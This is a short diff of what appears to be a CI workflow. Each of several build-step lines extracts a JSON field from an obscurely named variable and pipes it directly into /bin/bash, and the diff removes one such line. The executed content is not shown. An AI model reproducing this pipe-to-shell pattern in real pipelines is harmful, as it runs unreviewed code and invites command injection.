@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$oy92" | jq -r .xcg395 | /bin/bash
           echo $f944 | jq -r .tol65 | /bin/bash
           printf '%s' "$o25" | jq -r .wyyon4 | /bin/bash
-          echo $xchs94756 | jq -r .a92 | /bin/bash
           echo $v2740 | jq -r .aeq105 | /bin/bash
 
       - name: Archive results
